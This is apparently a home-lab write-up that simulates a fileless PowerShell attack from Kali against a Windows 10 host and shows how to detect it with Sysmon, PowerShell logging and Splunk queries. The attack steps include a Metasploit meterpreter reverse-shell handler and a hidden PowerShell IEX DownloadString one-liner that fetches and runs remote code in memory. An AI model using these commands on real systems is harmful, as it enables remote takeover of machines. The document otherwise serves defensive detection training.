# Scenario 1: Fileless Malware with PowerShell
## Phase 3: Advanced Threat Hunting & APT Simulation

---

## 🎯 Objective

Simulate a **fileless malware attack** delivered via **PowerShell**, mimicking real-world APT behavior through spear-phishing. The goal is to monitor and detect such attacks using Sysmon, PowerShell logs, and Splunk SIEM.

---

## 🧠 Attack Overview

A simulated PowerShell payload (delivered via phishing or script execution) is executed directly in memory without touching disk. These fileless attacks evade traditional antivirus and require behavioral detection using logs and SIEM correlation.

---

## ⚙️ Lab Setup

- **Attacker Machine:** Kali Linux
- **Victim Machine:** Windows 10 (Hostname: `DESKTOP-PERTPN8`)
- **SIEM:** Splunk on Ubuntu (receiving logs via Splunk Universal Forwarder)

---

## 🧪 Step-by-Step Attack Simulation

### 🔹 Step 1: Start a Reverse Shell Listener on Kali
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST 192.168.1.15
set LPORT 4444
exploit
🔹 Step 2: Host Malicious PowerShell Script
bash
Copy
Edit
python3 -m http.server 80
Note: If port 80 is already in use, run fuser -k 80/tcp or use a different port.

🔹 Step 3: Simulate Fileless Payload Execution on Windows
Run this PowerShell command on the victim machine:

powershell
Copy
Edit
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/shell.ps1')"
This command:

Bypasses execution policy

Hides the window

Executes remote code directly in memory (fileless)

📈 Detection & Analysis
✅ Log Sources to Monitor
Event Source	Event ID	Description
Sysmon	1	Process Creation
3	Network Connections
10	PowerShell Script Execution
Security Log	4688	New Process Created (powershell.exe)
PowerShell Logs	4104	Script Block Logging

🔍 Splunk Search Queries
View All Events from Victim Host:
spl
Copy
Edit
index=winlogs host=DESKTOP-PERTPN8
Focused Search on Suspicious Activities:
spl
Copy
Edit
index=winlogs (EventCode=1 OR EventCode=3 OR EventCode=10 OR EventCode=4104 OR EventCode=4688)
PowerShell Remote Code Execution Detection:
spl
Copy
Edit
index=winlogs EventCode=4104 ScriptBlockText="IEX*"
Network Connection from PowerShell:
spl
Copy
Edit
index=winlogs EventCode=3 Image="*powershell.exe"
📌 Tools Used
Metasploit (Kali) – Payload generation and handler

Sysmon – Advanced endpoint logging

PowerShell Logging – Script Block and Module Logging

Splunk (Ubuntu) – SIEM for detection and analysis

Splunk Universal Forwarder (Windows) – Log forwarding

✅ Detection Highlights
PowerShell logs (4104) captured the obfuscated remote script execution.

Sysmon Event ID 10 flagged suspicious in-memory script behavior.

Network logs (Sysmon 3) showed connections to attacker IP.

Process creation logs (4688 & Sysmon 1) linked powershell.exe to suspicious activity.

🧠 Lessons Learned
Fileless malware is stealthy and doesn’t write to disk — making traditional detection methods ineffective.

Behavioral monitoring via PowerShell logging and Sysmon is essential.

SIEM correlation helps in spotting lateral and advanced APT behavior.

Obfuscated PowerShell and Base64 encoded scripts are strong indicators of compromise (IoCs).
